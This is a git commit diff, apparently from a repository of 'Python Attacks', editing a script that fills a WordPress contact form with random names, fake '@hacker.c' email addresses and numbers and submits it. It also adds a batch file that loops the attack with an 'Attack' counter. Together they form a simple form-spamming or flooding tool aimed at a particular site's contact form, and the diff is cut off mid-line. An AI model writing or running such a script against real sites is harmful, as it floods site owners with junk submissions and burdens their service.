4fa62cd36c4ee22a9d1e8263a2b58aab71d96b00
Borderlord <102431262+Borderlord@users.noreply.github.com>
2023-07-15 17:46:46 +0000

    code indent

--- Python Attacks/gulia.py
+++ Python Attacks/gulia.py
@@ -13,4 +13,11 @@ cform = browser.get_form(action='/contact/#wpcf7-f206-p20-o1')
 cform['your-name'].value =  str(random.randint(1,12301983013801932801239)-234234)
 cform['your-email'].value =  str(random.randint(1,12301983013801932801239))+'@hacker.c'
 cform['tel-458'].value =  random.randint(1,12301983013801932801239)-973294729
-cform['your-message'].value = str(cfor
+cform['your-message'].value = str(cform)
+
+#print (cform)
+cform.serialize()
+browser.submit_form(cform)
+#i=i+1
+#print ('attack' + str(i))
+ 
---
+++ Python Attacks/guliaattack.bat
@@ -0,0 +1,6 @@
+@echo off
+set i=0
+:loop
+set /a i=i+1
+echo Attack - %i%
+pytho
